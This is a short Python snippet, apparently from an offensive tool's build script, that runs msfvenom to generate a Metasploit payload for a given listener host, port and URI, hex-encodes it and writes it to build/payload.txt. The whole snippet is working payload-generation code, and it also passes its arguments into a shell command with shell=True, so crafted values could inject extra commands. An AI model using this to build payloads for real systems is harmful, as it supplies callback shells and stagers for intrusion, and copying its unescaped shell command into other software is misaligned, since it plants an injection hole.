import subprocess

# Function to generate a payload using msfvenom and save bytes of the payload in a file
def msfvenom(payload, rhost, rport, ruri):
    print(f"Generating payload :")
    RURI_part = f" LURI={ruri}" if ruri else ""
    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} -f raw | xxd -p | tr -d '\\n' > build/payload.txt"
    print(command)
    subprocess.run(command, shell=True, check=True)
